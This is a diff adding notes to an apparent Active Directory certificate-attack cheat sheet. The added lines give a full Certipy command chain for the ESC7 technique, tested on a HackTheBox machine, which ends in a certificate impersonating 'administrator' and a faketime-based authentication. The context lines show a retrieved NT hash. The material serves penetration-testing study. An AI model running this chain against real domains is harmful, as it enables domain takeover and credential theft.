@@ -41,3 +41,23 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
+### ESC7
+Tested on https://app.hackthebox.com/machines/572
+```
+certipy-ad ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'pass'
+
+certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'pass'
+
+certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'pass'
+
+certipy-ad ca -ca manager-DC01-CA -issue-request 21 -username raven@manager.htb -p 'pass'
+
+certipy-ad req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 21 -username raven@manager.htb -p 'pass'
+```
+#### faketime
+```
+ntpdate -q 10.10.11.236
+
+faketime '2024-12-19 08:12:01' certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.236
+```
+
